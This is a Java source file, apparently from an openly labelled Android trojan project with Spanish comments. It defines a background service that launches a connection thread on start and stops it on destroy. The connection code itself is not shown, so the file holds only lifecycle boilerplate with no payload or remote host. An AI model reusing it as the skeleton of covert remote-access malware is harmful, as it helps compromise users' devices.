package trojan.android.android_trojan.action;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;


public class BackgroundService extends Service
{
    /* Variables */
    /* Tag del servicio */
    private static final String TAG = "BackgroundService";
    /* Hilo de la conexion */
    private Thread connectionServerThread;
    /* Objetode la clase ConnectionServerThread */
    private ConnectionServerThread runnable;

    /* Cuando se ejecuta este servicio (con start), se manda a llamar onCreate*/
    @Override
    public void onCreate()
    {
        super.onCreate();
        Log.d(TAG, "onCreate");

        /* Se manda a llamar a la clase para la conexion*/
        runnable = new ConnectionServerThread(getApplicationContext());
        /* Se lanza el hilo */
        connectionServerThread = new Thread(runnable);
    }

    /* Despues de que acabe onCreate, se ejecuta onStartCommand*/
    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        connectionServerThread.start();
        return super.onStartCommand(intent, flags, startId);
    }

    /* Cuando se ejecuta este servicio (con stop), se manda a llamar onDestroy*/
    @Override
    public void onDestroy()
    {
        super.onDestroy();
        Log.d(TAG, "onDestroy");
        runnable.cancel();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
